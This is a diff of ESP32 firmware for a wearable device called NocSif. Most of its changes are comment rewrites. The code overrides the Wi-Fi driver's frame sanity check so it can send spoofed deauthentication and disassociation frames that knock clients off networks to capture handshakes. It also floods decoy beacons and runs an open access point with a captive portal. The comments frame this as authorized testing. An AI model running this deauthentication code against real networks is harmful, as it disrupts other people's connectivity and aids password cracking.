- * under an authorized test. IDF's raw-TX path runs esp_wifi_80211_tx() through the weak library
- * function ieee80211_raw_frame_sanity_check(), whose default rejects spoofed management frames;
- * defining a strong override (below) permits the transmission this feature needs. */
+/* ---- management-frame TX (M5-P5.1, active — authorized testing) ---- *
+ * The first active WiFi operation: transmits spoofed-source
+ * deauthentication or disassociation frames to solicit a reconnect (which
+ * feeds the P4.1 handshake capture) or to exercise the P4.2 detectors,
+ * under an authorized test. IDF's raw-TX path runs esp_wifi_80211_tx()
+ * through the weak library function
+ * ieee80211_raw_frame_sanity_check(), whose default implementation rejects
+ * spoofed management frames; defining a strong override below permits the
+ * transmission this feature actually needs. */
 int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
 {
     (void)arg; (void)arg2; (void)arg3;
-    return 0;                                          /* allow raw management-frame TX */
+    return 0;                                          /* allows raw management-frame TX */
 }
 
-/* Build + send one deauth/disassoc frame (24-byte header + 2-byte reason). addr1=dest, addr2=source
- * (spoofs the AP), addr3=BSSID. For a specific client we also send the reverse direction so both
- * ends drop the association; a broadcast destination (FF..) needs only the AP→client direction. */
+/* Builds and sends one deauth/disassoc frame: a 24-byte header plus a
+ * 2-byte reason code. addr1 is the destination, addr2 the source (spoofing
+ * the AP), addr3 the BSSID. For a specific client this also sends the
+ * reverse direction, so both ends drop the association; a broadcast
+ * destination (all-FF) only needs the AP-to-client direction. */
 static void mgmt_tx_fire(void)
 {
     if (!s_tx_active || !s_mon_active || !s_tx_have_target) {
         return;
     }
     uint8_t f[26];
-    f[0] = s_tx_disassoc ? 0xA0 : 0xC0;                /* mgmt subtype 10 (disassoc) / 12 (deauth) */
+    f[0] = s_tx_disassoc ? 0xA0 : 0xC0;                /* management subtype 10 (disassoc) or 12 (deauth) */
     f[1] = 0x00;
-    f[2] = 0x00; f[3] = 0x00;                          /* duration */
-    memcpy(&f[4],  s_tx_client, 6);                    /* addr1 = destination */
-    memcpy(&f[10], s_tx_bssid,  6);                    /* addr2 = source (spoof the AP) */
-    memcpy(&f[16], s_tx_bssid,  6);                    /* addr3 = BSSID */
-    f[22] = 0x00; f[23] = 0x00;                        /* sequence (system may override) */
-    f[24] = 0x07; f[25] = 0x00;                        /* reason 7: class-3 frame from nonassoc STA */
+    f[2] = 0x00; f[3] = 0x00;                          /* duration field */
+    memcpy(&f[4],  s_tx_client, 6);                    /* addr1: the destination */
+    memcpy(&f[10], s_tx_bssid,  6);                    /* addr2: the source, spoofing the AP */
+    memcpy(&f[16], s_tx_bssid,  6);                    /* addr3: the BSSID */
+    f[22] = 0x00; f[23] = 0x00;                        /* sequence number, which the system may override */
+    f[24] = 0x07; f[25] = 0x00;                        /* reason 7: a class-3 frame from a non-associated station */
     esp_err_t e = esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof f, false);
     if (e == ESP_OK) {
         s_tx_count++;
     }
-    if (!s_tx_logged) {                                /* one-shot: confirm raw TX is permitted */
+    if (!s_tx_logged) {                                /* one-shot: confirms raw TX is actually permitted */
         s_tx_logged = true;
         ESP_LOGW(TAG, "mgmt-tx first frame -> %s", esp_err_to_name(e));
     }
     bool broadcast = true;
     for (int i = 0; i < 6; i++) { if (s_tx_client[i] != 0xFF) { broadcast = false; break; } }
-    if (!broadcast) {                                  /* reverse direction (client→AP) too */
+    if (!broadcast) {                                  /* the reverse direction (client to AP) too */
         memcpy(&f[4],  s_tx_bssid,  6);
         memcpy(&f[10], s_tx_client, 6);
         if (esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof f, false) == ESP_OK) {
@@ -2936,7 +3068,7 @@ static void mgmt_tx_fire(void)
     }
 }
 
-/* Periodic transmit + rate sampler (esp_timer task, off the LVGL task). */
+/* the periodic transmit and rate sampler, on the esp_timer task, off the LVGL task */
 static void mgmt_tx_tick(void *arg)
 {
     (void)arg;
@@ -2946,7 +3078,7 @@ static void mgmt_tx_tick(void *arg)
     mgmt_tx_fire();
     int64_t now = esp_timer_get_time();
     int64_t dt = now - s_tx_rate_t0;
-    if (dt >= 1000000) {                               /* ~1 s window */
+    if (dt >= 1000000) {                               /* a roughly 1s window */
         s_tx_rate = (uint32_t)((int64_t)(s_tx_count - s_tx_rate_base) * 1000000 / dt);
         s_tx_rate_base = s_tx_count;
         s_tx_rate_t0 = now;
@@ -2960,7 +3092,7 @@ static void do_mgmt_tx_target(const uint8_t bssid[6], int channel, const char *s
     snprintf(s_tx_ssid, sizeof s_tx_ssid, "%s", ssid ? ssid : "");
     s_tx_have_target = true;
     if (s_tx_active) {
-        do_mon_chan(s_tx_channel);                     /* re-lock to the new target's channel */
+        do_mon_chan(s_tx_channel);                     /* re-locks to the new target's channel */
     }
     ESP_LOGI(TAG, "mgmt-tx target %02x:%02x:%02x:%02x:%02x:%02x ch %d (%s)",
              bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], s_tx_channel,
@@ -2986,12 +3118,12 @@ static void do_mgmt_tx_on(void)
         ESP_LOGW(TAG, "mgmt-tx: monitor did not start");
         return;
     }
-    do_mon_chan(s_tx_channel);                          /* hold the target's channel */
+    do_mon_chan(s_tx_channel);                          /* holds the target's channel */
     s_tx_count = 0;
     s_tx_rate = 0;
     s_tx_rate_base = 0;
     s_tx_rate_t0 = esp_timer_get_time();
-    s_tx_logged = false;                                /* re-log the first TX result this session */
+    s_tx_logged = false;                                /* re-logs the first TX result this session */
     if (s_tx_timer == NULL) {
         const esp_timer_create_args_t a = { .callback = mgmt_tx_tick, .name = "wifimgmttx" };
         if (esp_timer_create(&a, &s_tx_timer) != ESP_OK) {
@@ -3000,7 +3132,7 @@ static void do_mgmt_tx_on(void)
         }
     }
     s_tx_active = true;
-    esp_timer_start_periodic(s_tx_timer, 100000);      /* 100 ms → ~10–20 frames/s (bounded) */
+    esp_timer_start_periodic(s_tx_timer, 100000);      /* 100ms, giving roughly 10-20 frames/s, bounded */
     ESP_LOGW(TAG, "mgmt-tx ON (%s) -> %02x:%02x:%02x:%02x:%02x:%02x ch %d",
              s_tx_disassoc ? "disassoc" : "deauth",
              s_tx_bssid[0], s_tx_bssid[1], s_tx_bssid[2],
@@ -3019,46 +3151,49 @@ static void do_mgmt_tx_off(void)
     ESP_LOGI(TAG, "mgmt-tx OFF (%u frames)", (unsigned)s_tx_count);
 }
 
-/* ---- beacon TX (M5-P5·2, active — authorized testing) ------------------------------- *
- * Advertises N decoy networks by transmitting beacon frames, each with a distinct
- * locally-administered BSSID and a generated "NocSif-NN" SSID (deliberately our own name — it does
- * not impersonate a real network). Reuses the P5·1 raw-TX override. */
+/* ---- beacon TX (M5-P5.2, active — authorized testing) ---- *
+ * Advertises N decoy networks by transmitting beacon frames, each with a
+ * distinct locally-administered BSSID and a generated "NocSif-NN" SSID —
+ * deliberately using our own name, so it never impersonates a real network.
+ * Reuses the P5.1 raw-TX override. */
 
-/* Deterministic, unique locally-administered BSSID per decoy index (02:4E:6F:63:hi:lo). */
+/* A deterministic, unique locally-administered BSSID per decoy index (02:4E:6F:63:hi:lo). */
 static void beacon_bssid(uint8_t out[6], int idx)
 {
-    out[0] = 0x02; out[1] = 0x4E; out[2] = 0x6F; out[3] = 0x63;  /* 0x02 = locally administered */
+    out[0] = 0x02; out[1] = 0x4E; out[2] = 0x6F; out[3] = 0x63;  /* 0x02 means locally administered */
     out[4] = (uint8_t)((idx >> 8) & 0xFF);
     out[5] = (uint8_t)(idx & 0xFF);
 }
 
-/* Build one beacon frame (header + fixed params + SSID/rates/DS-param IEs). Returns the length. */
+/* Builds one beacon frame: header plus fixed parameters plus SSID/rates/DS-param IEs. Returns its length. */
 static int beacon_build(uint8_t *f, const uint8_t bssid[6], const char *ssid, uint8_t channel)
 {
     int n = 0;
-    f[n++] = 0x80; f[n++] = 0x00;                     /* FC: management, subtype 8 (beacon) */
-    f[n++] = 0x00; f[n++] = 0x00;                     /* duration */
-    memset(&f[n], 0xFF, 6); n += 6;                   /* addr1 = broadcast */
-    memcpy(&f[n], bssid, 6); n += 6;                  /* addr2 = BSSID */
-    memcpy(&f[n], bssid, 6); n += 6;                  /* addr3 = BSSID */
-    f[n++] = 0x00; f[n++] = 0x00;                     /* sequence */
+    f[n++] = 0x80; f[n++] = 0x00;                     /* frame control: management, subtype 8 (beacon) */
+    f[n++] = 0x00; f[n++] = 0x00;                     /* duration field */
+    memset(&f[n], 0xFF, 6); n += 6;                   /* addr1: broadcast */
+    memcpy(&f[n], bssid, 6); n += 6;                  /* addr2: the BSSID */
+    memcpy(&f[n], bssid, 6); n += 6;                  /* addr3: the BSSID */
+    f[n++] = 0x00; f[n++] = 0x00;                     /* sequence number */
     memset(&f[n], 0, 8); n += 8;                      /* timestamp */
     f[n++] = 0x64; f[n++] = 0x00;                     /* beacon interval: 100 TU */
     f[n++] = 0x01; f[n++] = 0x00;                     /* capability: ESS */
     int slen = (int)strlen(ssid); if (slen > 32) slen = 32;
-    f[n++] = 0x00; f[n++] = (uint8_t)slen;            /* SSID IE (tag 0) */
+    f[n++] = 0x00; f[n++] = (uint8_t)slen;            /* SSID IE, tag 0 */
     memcpy(&f[n], ssid, slen); n += slen;
-    f[n++] = 0x01; f[n++] = 0x08;                     /* supported rates IE (tag 1) */
+    f[n++] = 0x01; f[n++] = 0x08;                     /* supported rates IE, tag 1 */
     f[n++] = 0x82; f[n++] = 0x84; f[n++] = 0x8B; f[n++] = 0x96;
     f[n++] = 0x0C; f[n++] = 0x12; f[n++] = 0x18; f[n++] = 0x24;
-    f[n++] = 0x03; f[n++] = 0x01; f[n++] = channel;   /* DS parameter set IE (tag 3): channel */
+    f[n++] = 0x03; f[n++] = 0x01; f[n++] = channel;   /* DS parameter set IE, tag 3: the channel */
     return n;
 }
 
-/* ---- beacon SSID list (managed by the UI; persisted to NVS) ------------------------- */
+/* ---- beacon SSID list: managed by the UI, persisted to NVS ---- */
 
-/* Save the whole list to NVS (count + per-index SSID/enabled). Snapshots under the lock, then does
- * the flash I/O off-lock. Called after each mutation (LVGL task; infrequent). */
+/* Saves the whole list to NVS: count plus each index's SSID and enabled
+ * flag. Snapshots the list under the lock first, then does the actual flash
+ * I/O outside the lock. Called after every mutation, on the LVGL task, so
+ * this runs infrequently. */
 static void beacon_persist(void)
 {
     bcn_entry_t local[BCN_MAX];
@@ -3076,13 +3211,13 @@ static void beacon_persist(void)
     }
 }
 
-/* Load the list from NVS once (idempotent). Reads off-lock, publishes under the lock. */
+/* Loads the list from NVS once; safe to call more than once. Reads outside the lock, publishes under the lock. */
 static void beacon_ensure_loaded(void)
 {
     if (s_bcn_loaded) {
         return;
     }
-    s_bcn_loaded = true;                              /* set first: a concurrent caller skips */
+    s_bcn_loaded = true;                              /* set first, so a concurrent caller skips the load */
     int cnt = nocsif_settings_get_i32("bc_cnt", 0);
     if (cnt < 0) cnt = 0;
     if (cnt > BCN_MAX) cnt = BCN_MAX;
@@ -3133,7 +3268,7 @@ bool nocsif_wifi_beacon_add(const char *ssid)
         return false;
     }
     char clean[WIFI_SSID_MAX];
-    snprintf(clean, sizeof clean, "%s", ssid);        /* truncates to 32 chars */
+    snprintf(clean, sizeof clean, "%s", ssid);        /* truncates to 32 characters */
     bool ok = false;
     portENTER_CRITICAL(&s_bcn_mux);
     bool dup = false;
@@ -3198,7 +3333,7 @@ void nocsif_wifi_beacon_toggle(int idx)
     if (ok) { s_bcn_gen++; beacon_persist(); }
 }
 
-/* Append up to `n` generated "NocSif-NN" decoy names (skips duplicates / respects BCN_MAX). */
+/* Appends up to `n` generated "NocSif-NN" decoy names, skipping duplicates and respecting BCN_MAX. */
 void nocsif_wifi_beacon_add_decoys(int n)
 {
     beacon_ensure_loaded();
@@ -3206,11 +3341,11 @@ void nocsif_wifi_beacon_add_decoys(int n)
     for (int i = 1; i <= 99 && added < n; i++) {
         char name[WIFI_SSID_MAX];
         snprintf(name, sizeof name, "NocSif-%02d", i);
-        if (nocsif_wifi_beacon_add(name)) added++;    /* add() dedups + persists each */
+        if (nocsif_wifi_beacon_add(name)) added++;    /* add() itself dedups and persists each entry */
     }
 }
 
-/* Count of currently-enabled entries (the ones that will actually transmit). */
+/* the count of currently enabled entries — the ones that will actually transmit */
 static int beacon_enabled_count(void)
 {
     int c = 0;
@@ -3220,9 +3355,11 @@ static int beacon_enabled_count(void)
     return c;
 }
 
-/* Emit one beacon for each ENABLED SSID (esp_timer task, off the LVGL task). Snapshots the enabled
- * entries under the lock into a static scratch (esp_timer task is single-threaded), then transmits
- * off-lock — never holding the spinlock across esp_wifi_80211_tx. */
+/* Emits one beacon for each enabled SSID, on the esp_timer task, off the
+ * LVGL task. Snapshots the enabled entries under the lock into a static
+ * scratch buffer (the esp_timer task is single-threaded), then transmits
+ * outside the lock — the spinlock is never held across an
+ * esp_wifi_80211_tx call. */
 static bcn_entry_t s_bcn_snap[BCN_MAX];
 static void beacon_tx_fire(void)
 {
@@ -3257,7 +3394,7 @@ static void beacon_tx_tick(void *arg)
     beacon_tx_fire();
     int64_t now = esp_timer_get_time();
     int64_t dt = now - s_bcn_rate_t0;
-    if (dt >= 1000000) {                               /* ~1 s window */
+    if (dt >= 1000000) {                               /* a roughly 1s window */
         s_bcn_rate = (uint32_t)((int64_t)(s_bcn_frames - s_bcn_rate_base) * 1000000 / dt);
         s_bcn_rate_base = s_bcn_frames;
         s_bcn_rate_t0 = now;
@@ -3283,7 +3420,7 @@ static void do_beacon_on(void)
         ESP_LOGW(TAG, "beacon: monitor did not start");
         return;
     }
-    do_mon_chan(s_mon_chan);                            /* hold a channel so the decoys appear stable */
+    do_mon_chan(s_mon_chan);                            /* holds a channel so the decoys appear stable */
     s_bcn_frames = 0;
     s_bcn_rate = 0;
     s_bcn_rate_base = 0;
@@ -3296,7 +3433,7 @@ static void do_beacon_on(void)
         }
     }
     s_bcn_active = true;
-    esp_timer_start_periodic(s_bcn_timer, 100000);      /* 100 ms → each SSID beaconed ~10x/s */
+    esp_timer_start_periodic(s_bcn_timer, 100000);      /* 100ms, so each SSID gets beaconed roughly 10x/s */
     ESP_LOGW(TAG, "beacon-tx ON (%d SSIDs, ch %d)", beacon_enabled_count(), s_mon_chan);
 }
 
@@ -3312,15 +3449,15 @@ static void do_beacon_off(void)
     ESP_LOGI(TAG, "beacon-tx OFF (%u frames)", (unsigned)s_bcn_frames);
 }
 
-/* ---- software access point (M5-P5·3, active — authorized testing) -------------------- */
+/* ---- software access point (M5-P5.3, active — authorized testing) ---- */
 
-/* Prime the AP config from NVS once (idempotent). Called at init and lazily by the getters/worker. */
+/* Primes the AP config from NVS once; safe to call more than once. Called at init and lazily by the getters/worker. */
 static void ap_cfg_ensure_loaded(void)
 {
     if (s_ap_cfg_loaded) {
         return;
     }
-    s_ap_cfg_loaded = true;                           /* set first: a concurrent caller skips */
+    s_ap_cfg_loaded = true;                           /* set first, so a concurrent caller skips the load */
     char buf[WIFI_SSID_MAX];
     nocsif_settings_get_str(K_AP_SSID, buf, sizeof buf, AP_SSID_DEF);
     portENTER_CRITICAL(&s_sap_mux);
@@ -3331,12 +3468,13 @@ static void ap_cfg_ensure_loaded(void)
     s_ap_hidden  = nocsif_settings_get_i32(K_AP_HIDDEN, 0) != 0;
 }
 
-/* Push the cached config into the driver as the AP config (worker only; the SSID is copied out of the
- * spinlock-guarded cache first). Applied before start, and again live on a reconfigure. */
+/* Pushes the cached config into the driver as the AP config; worker
+ * only, with the SSID copied out of the spinlock-guarded cache first.
+ * Applied before start, and again live on a reconfigure. */
 static void apply_ap_config(void)
 {
     char ssid[WIFI_SSID_MAX];
-    if (s_ap_ssid_ov[0]) {                            /* §4.8a companion overrides the SSID for its session */
+    if (s_ap_ssid_ov[0]) {                            /* section 4.8a companion overrides the SSID for its own session */
         snprintf(ssid, sizeof ssid, "%s", s_ap_ssid_ov);
     } else {
         portENTER_CRITICAL(&s_sap_mux);
@@ -3351,14 +3489,16 @@ static void apply_ap_config(void)
     snprintf((char *)wc.ap.ssid, sizeof wc.ap.ssid, "%s", ssid);
     wc.ap.ssid_len       = (uint8_t)strlen((char *)wc.ap.ssid);
     wc.ap.channel        = (uint8_t)((s_ap_channel >= 1 && s_ap_channel <= 13) ? s_ap_channel : 1);
-    /* §4.8a companion may secure its AP with WPA2 (password staged in s_ap_pass_ov; ≥8 chars = WPA2's
-     * minimum). Everything else — software AP, captive portal — stays OPEN as shipped. */
+    /* Section 4.8a companion may secure its own AP with WPA2 — the password
+     * staged in s_ap_pass_ov, 8 or more characters being WPA2's minimum.
+     * Everything else — the software AP, the captive portal — stays open, as
+     * originally shipped. */
     if (s_ap_pass_ov[0] && strlen(s_ap_pass_ov) >= 8) {
         wc.ap.authmode = WIFI_AUTH_WPA2_PSK;
         snprintf((char *)wc.ap.password, sizeof wc.ap.password, "%s", s_ap_pass_ov);
         wc.ap.pmf_cfg.required = false;
     } else {
-        wc.ap.authmode = WIFI_AUTH_OPEN;              /* open AP (software AP · portal · unsecured companion) */
+        wc.ap.authmode = WIFI_AUTH_OPEN;              /* an open AP: the software AP, the portal, or an unsecured companion */
     }
     wc.ap.ssid_hidden    = s_ap_hidden ? 1 : 0;
     wc.ap.max_connection = (uint8_t)((s_ap_maxconn >= 1 && s_ap_maxconn <= AP_CLI_MAX) ? s_ap_maxconn : 4);
@@ -3366,9 +3506,11 @@ static void apply_ap_config(void)
     ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_set_config(WIFI_IF_AP, &wc));
 }
 
-/* Refresh the connected-client snapshot off the LVGL task (esp_timer). The driver association table is
- * the source of truth; the DHCP-server lease table fills each client's IP. Publishes lock-free into the
- * inactive buffer, then flips the index. Single writer (this timer), so no lock on the snapshot. */
+/* Refreshes the connected-client snapshot off the LVGL task, on the
+ * esp_timer. The driver's association table is the source of truth, and the
+ * DHCP server's lease table fills in each client's IP. Publishes lock-free
+ * into the inactive buffer, then flips the active index. There's only one
+ * writer, this timer, so no lock is needed on the snapshot itself. */
 static void ap_tick(void *arg)
 {
     (void)arg;
@@ -3379,27 +3521,27 @@ static void ap_tick(void *arg)
     if (esp_wifi_ap_get_sta_list(&sl) != ESP_OK) {
         sl.num = 0;
     }
-    int w = s_ap_cli_i ^ 1;                           /* fill the inactive buffer */
+    int w = s_ap_cli_i ^ 1;                           /* fills the inactive buffer */
     int cnt = 0;
     esp_netif_pair_mac_ip_t pairs[AP_CLI_MAX];
     for (int i = 0; i < sl.num && cnt < AP_CLI_MAX; i++) {
         memcpy(s_ap_cli[w][cnt].mac, sl.sta[i].mac, 6);
         s_ap_cli[w][cnt].rssi  = sl.sta[i].rssi;
         s_ap_cli[w][cnt].ip[0] = '\0';
-        memcpy(pairs[cnt].mac, sl.sta[i].mac, 6);      /* MAC in, IP out */
+        memcpy(pairs[cnt].mac, sl.sta[i].mac, 6);      /* MAC goes in, IP comes out */
         memset(&pairs[cnt].ip, 0, sizeof pairs[cnt].ip);
         cnt++;
     }
     if (cnt > 0 && s_ap_netif &&
         esp_netif_dhcps_get_clients_by_mac(s_ap_netif, cnt, pairs) == ESP_OK) {
         for (int i = 0; i < cnt; i++) {
-            if (pairs[i].ip.addr != 0) {               /* 0 = no lease handed out yet */
+            if (pairs[i].ip.addr != 0) {               /* 0 means no lease has been handed out yet */
                 snprintf(s_ap_cli[w][i].ip, sizeof s_ap_cli[w][i].ip,
                          IPSTR, IP2STR(&pairs[i].ip));
             }
         }
     }
-    /* structural change vs the published buffer (count or MAC set) -> bump gen so the list rebuilds */
+    /* a structural change versus the published buffer — either the count or the MAC set — bumps gen so the list rebuilds */
     int cur = s_ap_cli_i;
     bool changed = (cnt != s_ap_cli_cnt[cur]);
     for (int i = 0; !changed && i < cnt; i++) {
@@ -3408,22 +3550,24 @@ static void ap_tick(void *arg)
         }
     }
     s_ap_cli_cnt[w] = cnt;
-    s_ap_cli_i = w;                                    /* publish atomically */
+    s_ap_cli_i = w;                                    /* publishes atomically */
     if (changed) {
         s_ap_cli_gen++;
-        refresh_strings();                             /* the client count feeds the detail line */
+        refresh_strings();                             /* the client count feeds into the detail line */
     }
 }
 
-/* Drop the AP to a stopped radio in STA mode (no restart). Shared by the Stop path (do_ap_off, which
- * then restarts STA + rejoins) and the STA entry points (which start their own STA flow). */
+/* Drops the AP to a stopped radio in STA mode, without restarting it.
+ * Shared by the Stop path — do_ap_off, which then restarts STA and
+ * rejoins — and by the STA entry points, which start their own STA flow
+ * afterward. */
 static void ap_teardown(void)
 {
     if (!s_ap_active) {
         return;
     }
-    companion_stop();                                 /* §4.8a: the companion surface rides on the AP too */
-    portal_stop();                                    /* the portal rides on the AP — drop it first */
+    companion_stop();                                 /* section 4.8a: the companion surface rides on the AP too */
+    portal_stop();                                    /* the portal rides on the AP as well: drop it first */
     if (s_ap_timer) {
         esp_timer_stop(s_ap_timer);
     }
@@ -3435,7 +3579,7 @@ static void ap_teardown(void)
     esp_wifi_stop();                                  /* AP_STOP */
     s_sta_started = false;
     ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_set_mode(WIFI_MODE_STA));
-    publish_current_mac();                            /* STA MAC back in the readout */
+    publish_current_mac();                            /* puts the station MAC back into the readout */
     ESP_LOGI(TAG, "software AP OFF");
 }
 
@@ -3449,7 +3593,7 @@ static void do_ap_on(void)
     }
     ap_cfg_ensure_loaded();
 
-    if (s_ap_active) {                                /* already up -> live reconfigure */
+    if (s_ap_active) {                                /* already up: do a live reconfigure instead */
         apply_ap_config();
         ESP_LOGI(TAG, "software AP reconfigured (ch %d %s)",
                  s_ap_channel, s_ap_hidden ? "hidden" : "visible");
@@ -3457,10 +3601,10 @@ static void do_ap_on(void)
         return;
     }
 
-    /* Single radio: suspend capture + the STA link (remember it so Stop can restore it). */
+    /* with only one radio: suspends capture plus the STA link, remembering it so Stop can restore it later */
     s_ap_prev_connected = s_connected;
     monitor_teardown();
-    s_want_connect = false;                           /* the disconnect handler must not retry */
+    s_want_connect = false;                           /* the disconnect handler must not retry after this */
     if (s_connected || s_sta_started) {
         esp_wifi_disconnect();
     }
@@ -3469,7 +3613,7 @@ static void do_ap_on(void)
     clear_netinfo();
 
     if (s_ap_netif == NULL) {
-        s_ap_netif = esp_netif_create_default_wifi_ap();   /* default AP netif = built-in DHCP server */
+        s_ap_netif = esp_netif_create_default_wifi_ap();   /* the default AP netif runs the built-in DHCP server */
         if (s_ap_netif == NULL) {
             ESP_LOGE(TAG, "create_default_wifi_ap failed");
             publish_status("err");
@@ -3479,7 +3623,7 @@ static void do_ap_on(void)
     }
 
     if (s_sta_started) {
-        esp_wifi_stop();                              /* clean mode switch (STA_STOP follows) */
+        esp_wifi_stop();                              /* a clean mode switch; the STA_STOP event follows */
         s_sta_started = false;
     }
     ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_set_mode(WIFI_MODE_AP));
@@ -3490,11 +3634,11 @@ static void do_ap_on(void)
         ESP_LOGE(TAG, "esp_wifi_start (AP): %s", esp_err_to_name(e));
         publish_status("err");
         publish_detail("AP failed to start.");
-        esp_wifi_set_mode(WIFI_MODE_STA);             /* leave a sane mode behind */
+        esp_wifi_set_mode(WIFI_MODE_STA);             /* leave a sane mode behind on any exit path */
         return;
     }
 
-    uint8_t apmac[6];                                 /* the AP's own MAC + gateway IP for the readout */
+    uint8_t apmac[6];                                 /* the AP's own MAC and gateway IP, for the readout */
     if (esp_wifi_get_mac(WIFI_IF_AP, apmac) == ESP_OK) {
         char s[18];
         format_mac(s, sizeof s, apmac);
@@ -3505,7 +3649,7 @@ static void do_ap_on(void)
         snprintf(s_ap_ip, sizeof s_ap_ip, IPSTR, IP2STR(&ipinfo.ip));
     }
 
-    s_ap_cli_cnt[0] = s_ap_cli_cnt[1] = 0;            /* start with an empty client list */
+    s_ap_cli_cnt[0] = s_ap_cli_cnt[1] = 0;            /* starts with an empty client list */
     s_ap_cli_i = 0;
     s_ap_cli_gen++;
     if (s_ap_timer == NULL) {
@@ -3513,7 +3657,7 @@ static void do_ap_on(void)
         ESP_ERROR_CHECK_WITHOUT_ABORT(esp_timer_create(&ta, &s_ap_timer));
     }
     if (s_ap_timer) {
-        esp_timer_start_periodic(s_ap_timer, 750000);  /* 750 ms client-list refresh */
+        esp_timer_start_periodic(s_ap_timer, 750000);  /* a 750ms client-list refresh cadence */
     }
 
     s_ap_active = true;
@@ -3531,7 +3675,7 @@ static void do_ap_off(void)
         return;
     }
     bool rejoin = s_ap_prev_connected && s_ssid[0] && s_autojoin;
-    ap_teardown();                                    /* radio now stopped in STA mode */
+    ap_teardown();                                    /* the radio is now stopped, in STA mode */
     s_want_connect = rejoin;
     if (rejoin) {
         s_retry = 0;
@@ -3539,30 +3683,40 @@ static void do_ap_off(void)
         s_join_state = NOCSIF_WIFI_JOIN_JOINING;
         apply_config();
     }
-    ensure_started();                                 /* STA_START -> try_connect() if wanted */
+    ensure_started();                                 /* STA_START fires, and try_connect() runs if a link is still wanted */
     if (s_sta_started && rejoin) {
         try_connect();
     }
     refresh_strings();
 }
 
-/* ============================ §4.8a Companion control surface (L4) — P1 ==================== *
- * Reuses the shipped software-AP bring-up (open AP; s_ap_ssid_ov gives it a device-name SSID, honoured
- * by apply_ap_config) and layers an mDNS responder + a routed HTTP server (its own handle) on top —
- * the same "ride on the AP" pattern the captive portal uses, but owner-scope and mutually exclusive
- * with the portal. Bluetooth is NOT touched (the controller is resident since RAM Phase 2, so the
- * surface coexists with the phone link); here we log heap health and fail safe if the AP or HTTP
- * can't start. The HTTP server task runs on a PSRAM stack (P4): an internal stack alive across a
- * sustained WiFi transfer competes with WiFi's dynamic RX buffers for the same scarce pool (the §4.10
- * download lesson), and the /sd file browser streams multi-MB files through this task. */
+/* ============ section 4.8a companion control surface (L4), P1 ============ *
+ * Reuses the already-shipped software-AP bring-up — an open AP, with
+ * s_ap_ssid_ov giving it a device-name SSID, honored by apply_ap_config —
+ * and layers an mDNS responder plus a routed HTTP server (its own handle)
+ * on top. This is the same "ride on the AP" pattern the captive portal
+ * uses, but scoped to the operator and mutually exclusive with the portal.
+ * Bluetooth is left untouched — the controller has been resident since RAM
+ * Phase 2, so this surface coexists fine with the phone link — but this
+ * code logs heap health and fails safely if either the AP or the HTTP
+ * server can't start. The HTTP server task runs on a PSRAM stack (P4):
+ * keeping an internal stack alive across a sustained WiFi transfer would
+ * compete with WiFi's own dynamic RX buffers for the same scarce pool (the
+ * section 4.10 download lesson), and the /sd file browser streams
+ * multi-megabyte files through this very task. */
 
-/* The served control page (P2 redesign + P3 live): a self-contained styled surface (no external assets)
- * that MIRRORS the watch. It fetches GET /api/menu and renders the same three Home categories
- * (Cyber/Life/System) with their real rows — radio-disruptive rows confirm before launching (warn flag).
- * Below the menu sits the Control Center (flash/DND/Movie toggles + brightness/volume sliders). Live
- * state (screen title, toggles, sliders, focused-field flag) arrives over the /ws WebSocket (falling
- * back to /api/ping polling); when the watch reports a focused text field, a bottom bar lets the phone
- * raise its own native keyboard (a hidden input) so typing rides /api/type + /api/key. P4 = /sd browser. */
+/* The served control page (P2 redesign plus P3 live view): a
+ * self-contained, styled surface with no external assets that mirrors the
+ * watch. It fetches GET /api/menu and renders the same three Home
+ * categories (Cyber/Life/System) with their real rows — radio-disruptive
+ * rows require confirmation before launching, via the warn flag. Below the
+ * menu sits the Control Center: flash/DND/Movie toggles plus
+ * brightness/volume sliders. Live state — screen title, toggles, sliders,
+ * whether a field has focus — arrives over the /ws WebSocket, falling back
+ * to /api/ping polling; when the watch reports a focused text field, a
+ * bottom bar lets the phone raise its own native keyboard (via a hidden
+ * input), so typing rides on /api/type plus /api/key. P4 adds the /sd
+ * browser. */
 static const char COMP_PAGE_HTML[] =
 "<!DOCTYPE html><html lang='en'><head><meta charset='utf-8'>"
 "<meta name='viewport' content='width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no'>"
@@ -3589,7 +3743,7 @@ static const char COMP_PAGE_HTML[] =
 "border:1px solid var(--edge);border-radius:10px;color:#e6e6ea;font:inherit;font-size:15px;"
 "font-family:Georgia,serif;padding:13px 14px;margin:8px 0 0;cursor:pointer}"
 ".cat .car{color:var(--dim);font-size:12px;transition:transform .15s}.cat.open .car{transform:rotate(90deg)}"
-/* nested sub-menus use display-toggle (not max-height) so arbitrary depth never clips */
+/* nested sub-menus use display-toggle, not max-height, so arbitrary nesting depth is never clipped */
 ".rows{display:none}.rows.open{display:block}"
 ".mrow{display:flex;align-items:center;justify-content:space-between;gap:8px;width:100%;background:#151519;"
 "border:1px solid var(--edge);border-top:0;color:var(--ink);font:inherit;font-size:14px;"
@@ -3604,23 +3758,25 @@ static const char COMP_PAGE_HTML[] =
 "padding:12px 16px;display:none;align-items:center;justify-content:space-between;gap:10px;"
 "font-size:13px;color:var(--ink);z-index:9}#kbar.show{display:flex}#kbtap{flex:1;text-align:left}"
 "#kbx{background:#26262a;border:1px solid var(--edge);border-radius:8px;color:var(--ink);font:inherit;padding:8px 14px}"
-/* on-screen but invisible: iOS only raises the keyboard for a focus() on a visible, in-viewport input
- * (an off-screen one is ignored); pointer-events:none so it never steals taps from #kbar. 16px font
- * avoids the mobile auto-zoom. */
+/* On-screen but invisible: iOS only raises the keyboard for a focus()
+ * call on a visible, in-viewport input — an off-screen one is ignored — so
+ * pointer-events:none is used instead, which also keeps it from ever
+ * stealing taps meant for #kbar. 16px font avoids the mobile auto-zoom
+ * behavior. */
 "#kb{position:fixed;left:0;bottom:0;width:100%;height:46px;opacity:0;font-size:16px;"
 "pointer-events:none;border:0;z-index:8}"
-/* live screen preview card (tap → full control stage). Canvas backing = frame px; CSS scales it. */
+/* the live screen preview card; tapping it opens the full control stage. The canvas backing matches the frame pixels; CSS scales it up. */
 ".mircard{display:flex;flex-direction:column;align-items:center;gap:8px;width:100%;background:var(--panel);"
